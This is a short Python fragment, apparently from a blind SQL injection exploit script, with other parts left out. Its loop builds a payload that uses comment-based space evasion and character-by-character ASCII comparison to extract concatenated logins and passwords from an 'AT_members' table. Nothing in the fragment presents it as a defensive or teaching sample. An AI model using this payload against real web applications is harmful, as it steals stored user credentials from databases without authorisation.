...
def main():
    ...
    for i in range(1,40):
    	injection_string = "test')/**/or/**/(ascii(substring((select/**/concat(login,/**/password)/**/from/**/AT_members),%d,1)))=[CHAR]%%23" % i
    	#select/**/concat(login, password)/**/from/**/AT_members
    	#select login, password from AT_members
